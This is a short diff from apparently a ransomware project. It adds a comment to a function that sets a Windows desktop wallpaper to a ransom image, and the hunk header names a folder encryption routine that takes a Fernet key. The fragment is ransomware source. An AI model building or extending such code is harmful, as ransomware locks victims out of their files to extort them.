@@ -111,6 +111,7 @@ def encrypt_decrypt_folder(folder_path,fernet,value):
 # Purpose      : alter desktop wallpaper of a windows PC
 # Arguments    : none
 # Return       : none  
+# it would be more correctly if I have an argument that specifiy the path to the picture; it was just a matter of simplicity
 def alter_desktop_wallpaper():
     wallpaper_path = r"C:\Users\35193\Documents\ransom.png"
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 0)
